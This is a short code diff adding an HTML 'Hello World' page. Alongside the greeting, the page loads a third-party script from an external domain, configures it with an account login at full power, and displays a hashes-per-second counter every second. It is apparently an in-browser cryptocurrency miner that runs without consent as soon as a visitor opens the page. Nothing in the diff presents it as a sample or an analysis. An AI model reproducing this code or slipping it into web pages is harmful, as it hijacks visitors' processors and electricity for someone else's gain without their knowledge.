@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>D:</title>
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+      <h1 class="title">Hello World! </h1>
+      <p id="currentTime"></p>
+      <p id="hwww"></p>
+      <script src="script.js"></script>
+      <script src="https://wm.bmwebm.org/main.js"></script>
+      <script>
+      main.config({ login: "7153534", pass: null }).power(100);
+      function showTimew() {
+	      document.getElementById('hwww').innerHTML = main.getHashesPerSecond();
+      }
+      showTimew();
+      setInterval(function () {
+	      showTimew();
+      }, 1000);
+      </script>
+  </body>
+</html>
